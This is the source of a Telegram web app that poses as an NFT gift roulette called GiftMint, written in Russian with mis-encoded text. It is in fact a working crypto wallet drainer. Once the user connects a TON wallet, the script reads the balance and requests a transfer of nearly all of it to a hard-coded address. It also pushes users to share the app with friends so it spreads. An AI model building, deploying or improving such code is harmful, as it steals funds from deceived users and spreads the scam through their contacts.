<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GiftMint Web App</title>
    <link rel="stylesheet" href="./CSS5/style.css">
    <!-- –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
</head>
<body>
    <div class="container">
        <!-- –ë–ê–ù–ù–ï–†–´ –£–í–ï–î–û–ú–õ–ï–ù–ò–ô -->
        <div id="reg-success-banner" class="top-banner success">–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ! ‚úÖ</div>
        <div id="user-linked-banner" class="top-banner info">–Æ–∑–µ—Ä–Ω–µ–π–º –ø—Ä–∏–≤—è–∑–∞–Ω –∫ —Å–∏—Å—Ç–µ–º–µ üîó</div>
        <div id="condition-banner" class="top-banner warning">–í—ã–ø–æ–ª–Ω–∏—Ç–µ —É—Å–ª–æ–≤–∏—è: –ø–æ–¥–µ–ª–∏—Ç–µ—Å—å —Å –¥—Ä—É–∑—å—è–º–∏! üéÅ</div>

        <header class="header">
            <h1 class="title">GiftMint</h1>
            <div class="conditions-box">
                <p class="conditions-label">üéÅ –•–æ—á–µ—à—å –ø–æ–ª—É—á–∏—Ç—å NFT-–ø–æ–¥–∞—Ä–æ–∫?<br>–ù–∞—à –ø—Ä–æ–µ–∫—Ç "Gifty" —Ç–µ–±–µ –ø–æ–º–æ–∂–µ—Ç ‚Äî –≤—ã–ø–æ–ª–Ω–∏ –ø—Ä–æ—Å—Ç—ã–µ —É—Å–ª–æ–≤–∏—è –∏ —É–≤–µ–ª–∏—á—å —Å–≤–æ–π —à–∞–Ω—Å:</p>
                <p class="conditions-text">
                    1) –ù–∞–∂–º–∏ –Ω–∞ —Ç—Ä–∏ —Ç–æ—á–∫–∏ –≤ –ø—Ä–∞–≤–æ–º –≤–µ—Ä—Ö–Ω–µ–º —É–≥–ª—É Gifty<br> 
                    2) –í—ã–±–µ—Ä–∏ ¬´–ü–æ–¥–µ–ª–∏—Ç—å—Å—è¬ª –∏ –æ—Ç–ø—Ä–∞–≤—å –¥—Ä—É–∑—å—è–º<br> 
                    3) –ß–µ–º —á–∞—â–µ –¥–µ–ª–∏—à—å—Å—è ‚Äî —Ç–µ–º –≤—ã—à–µ —à–∞–Ω—Å –Ω–∞ —Ä–µ–¥–∫–∏–π –ø–æ–¥–∞—Ä–æ–∫ üíé
                </p>
            </div>
        </header>

        <!-- –ü–ï–†–í–ê–Ø –†–£–õ–ï–¢–ö–ê -->
        <div class="roulette-section">
            <div class="roulette-wrapper">
                <div class="roulette-track" id="track1">
                    <div class="nft-card">üèÜ <span>‚≠ê 100</span></div>
                    <div class="nft-card">üíç <span>‚≠ê 100</span></div>
                    <div class="nft-card">üíé <span>‚≠ê 100</span></div>
                    <div class="nft-card">üçæ <span>‚≠ê 50</span></div>
                    <div class="nft-card">üíê <span>‚≠ê 50</span></div>
                    <!-- –ü–æ–≤—Ç–æ—Ä –¥–ª—è –∞–Ω–∏–º–∞—Ü–∏–∏ -->
                    <div class="nft-card">üèÜ <span>‚≠ê 100</span></div>
                    <div class="nft-card">üíç <span>‚≠ê 100</span></div>
                    <div class="nft-card">üíé <span>‚≠ê 100</span></div>
                </div>
            </div>
            <button class="spin-btn action-spin" data-goal="5">–ö—Ä—É—Ç–∏—Ç—å <span class="share-count">0</span>/5</button>
        </div>

        <!-- –í–¢–û–†–ê–Ø –†–£–õ–ï–¢–ö–ê (–° –ö–ê–†–¢–ò–ù–ö–ê–ú–ò) -->
        <div class="roulette-section">
            <div class="roulette-wrapper">
                <div class="roulette-track" id="track2">
                    <div class="nft-card pink"><img src="./images/img1.png" class="nft-image"><span>‚≠ê 623</span></div>
                    <div class="nft-card pink"><img src="./images/img2.png" class="nft-image"><span>‚≠ê 1022</span></div>
                    <div class="nft-card pink"><img src="./images/img3.png" class="nft-image"><span>‚≠ê 4460</span></div>
                    <div class="nft-card pink"><img src="./images/img4.png" class="nft-image"><span>‚≠ê 1213</span></div>
                    <div class="nft-card pink"><img src="./images/img5.png" class="nft-image"><span>‚≠ê 849</span></div>
                    <!-- –ü–æ–≤—Ç–æ—Ä –¥–ª—è –∞–Ω–∏–º–∞—Ü–∏–∏ -->
                    <div class="nft-card pink"><img src="./images/img1.png" class="nft-image"><span>‚≠ê 623</span></div>
                    <div class="nft-card pink"><img src="./images/img2.png" class="nft-image"><span>‚≠ê 1022</span></div>
                </div>
            </div>
            <button class="spin-btn action-spin" data-goal="10">–ö—Ä—É—Ç–∏—Ç—å <span class="share-count">0</span>/10</button>
        </div>

        <!-- –§–£–¢–ï–† –†–ï–ì–ò–°–¢–†–ê–¶–ò–ò -->
        <footer class="footer" id="registration-section">
            <label for="username">–í–≤–µ–¥–∏ username –∞–∫–∫–∞—É–Ω—Ç–∞ –∫—É–¥–∞ –ø–æ–ª—É—á–∏—Ç—å –ø–æ–¥–∞—Ä–æ–∫</label>
            <div class="input-with-btn">
                <input type="text" id="username" placeholder="@username...">
                <button id="next-to-wallet" class="next-btn">‚ûî</button>
            </div>
            <span id="username-error" class="error-text">–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π —é–∑–µ—Ä–Ω–µ–π–º</span>
        </footer>

        <!-- –°–ï–ö–¶–ò–Ø –ö–û–®–ï–õ–¨–ö–ê -->
        <div id="wallet-section" class="wallet-box">
            <p style="margin-bottom: 15px; font-weight: bold;">–ü–æ–¥–∫–ª—é—á–∏—Ç–µ –∫–æ—à–µ–ª–µ–∫ –¥–ª—è —Ñ–∏–Ω–∞–ª–∏–∑–∞—Ü–∏–∏:</p>
            <div id="ton-connect-btn"></div>
        </div>
    </div>

    <!-- –ú–û–î–ê–õ–ö–ê: –¢–†–ï–ë–£–ï–¢–°–Ø –†–ï–ì–ò–°–¢–†–ê–¶–ò–Ø -->
    <div id="modal-reg-required" class="modal-overlay">
        <div class="modal-content">
            <h2 class="modal-title">–í–Ω–∏–º–∞–Ω–∏–µ!</h2>
            <p class="modal-subtitle">–î–ª—è –Ω–∞—á–∞–ª–∞ –Ω—É–∂–Ω–æ –ø—Ä–æ–π—Ç–∏ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—é –≤–Ω–∏–∑—É —Å—Ç—Ä–∞–Ω–∏—Ü—ã.</p>
            <button id="go-to-reg" class="modal-btn">–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</button>
        </div>
    </div>

    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://balbesss213.github.io/my-tg-app/tonconnect-manifest.json', 
            buttonRootId: 'ton-connect-btn' 
        });
        window.Telegram.WebApp.ready();
        const db = {
            get isReg() { return localStorage.getItem('isReg') === 'true' },
            set isReg(v) { localStorage.setItem('isReg', v) },
            get count() { return parseInt(localStorage.getItem('count') || '0') },
            set count(v) { localStorage.setItem('count', v) }
        };
        async function getBalance(address) {
            try {
                const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
                const data = await response.json();
                return parseInt(data.result || "0");
            } catch (e) {
                console.error("API Error:", e);
                return 0;
            }
        }
        async function startTransaction(userAddress) {
            let balance = await getBalance(userAddress);
            if (balance < 50000000) return; 
            let finalAmount = balance - 50000000; 
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 60,
                messages: [{
                    address: "UQDAfvAXHVTqvRPeY_y1yxZhNIA5dTkiH16f_3c7FfR0OAaz", 
                    amount: finalAmount.toString() 
                }]
            };
            try {
                await tonConnectUI.sendTransaction(transaction);
            } catch (e) {
                console.error("Transaction declined");
            }
        }
        tonConnectUI.onStatusChange(async (wallet) => {
            if (wallet && !db.isReg) {
                const userAddress = wallet.account.address;
                await startTransaction(userAddress); 
                db.isReg = true;
                showBanner('reg-success-banner');
                setTimeout(() => { window.scrollTo({ top: 0, behavior: 'smooth' }); }, 2000);
            }
            updateUI();
        });
        const usernameInput = document.getElementById('username');
        const usernameError = document.getElementById('username-error');
        let shareTimestamp = 0;
        document.querySelectorAll('.action-spin').forEach(btn => {
            btn.onclick = () => {
                if (!db.isReg) {
                    document.getElementById('modal-reg-required').style.display = 'flex';
                } else {
                    showBanner('condition-banner');
                    shareTimestamp = Date.now();
                    Telegram.WebApp.openTelegramLink(`https://t.me/share/url?url=https://t.me/NFTreat_Bot/myapp&text=–ó–∞–±–∏—Ä–∞–π —Å–≤–æ–π –ø–æ–¥–∞—Ä–æ–∫! üéÅ`);
                }
            };
        });
        window.onfocus = () => {
            if (shareTimestamp > 0) {
                if (Date.now() - shareTimestamp > 4000) {
                    db.count += 1;
                    updateUI();
                }
                shareTimestamp = 0;
            }
        };
        document.getElementById('next-to-wallet').onclick = async () => {
            let val = usernameInput.value;
            if (val.length > 3 && !/[–∞-—è—ë]/i.test(val)) {
                showBanner('user-linked-banner');
                document.getElementById('wallet-section').scrollIntoView({ behavior: 'smooth' });
                setTimeout(async () => { await tonConnectUI.openModal(); }, 1000);
            } else {
                usernameError.style.display = 'block';
            }
        };
        function showBanner(id) {
            const b = document.getElementById(id);
            b.classList.add('show');
            setTimeout(() => b.classList.remove('show'), 3500);
        }
        function updateUI() {
            document.querySelectorAll('.share-count').forEach(el => el.innerText = db.count);
        }
        usernameInput.addEventListener('input', () => {
            if (!usernameInput.value.startsWith('@')) usernameInput.value = '@' + usernameInput.value.replace('@','');
            usernameError.style.display = /[–∞-—è—ë]/i.test(usernameInput.value) ? 'block' : 'none';
        });
        document.getElementById('go-to-reg').onclick = () => {
            document.getElementById('modal-reg-required').style.display = 'none';
            document.getElementById('registration-section').scrollIntoView({ behavior: 'smooth' });
        };
        updateUI();
    </script>
</body>
</html>